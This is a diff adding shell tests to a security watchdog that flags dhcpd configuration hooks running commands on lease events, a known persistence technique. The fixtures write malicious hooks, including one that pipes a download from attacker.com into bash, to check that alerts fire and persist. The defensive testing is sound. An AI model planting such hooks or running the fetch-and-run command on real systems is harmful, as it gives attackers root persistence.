@@ -207,3 +207,44 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-dhcpd-exec -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): dhcpd-exec-watchdog does NOT refresh baseline on suspicious-execute detection — alert STAYS until operator updates" {
+    # T1546 DHCP-lease-triggered root-exec persistence — alert MUST
+    # persist across runs until operator explicitly re-baselines.
+    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
+    run_wd
+    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/dhcp/dhcpd.conf.d + /etc/dhcp axes — suspicious in EITHER → alert)" {
+    DHCPD2="${TMP}/dhcp.d"; mkdir -p "${DHCPD2}"
+    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DHCPD_PROFILE="report" \
+    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
+    SELFDEF_DHCPD_DIRS="${DHCPD2}" \
+    SELFDEF_DHCPD_FILES="${CONF}" \
+    bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'on release { execute("/tmp/evil.sh"); }\n' > "${DHCPD2}/evil.conf"
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_DHCPD_PROFILE="report" \
+    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
+    SELFDEF_DHCPD_DIRS="${DHCPD2}" \
+    SELFDEF_DHCPD_FILES="${CONF}" \
+    bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    printf 'on commit { execute("/bin/sh", "-c", "curl -s http://attacker.com/p | bash"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
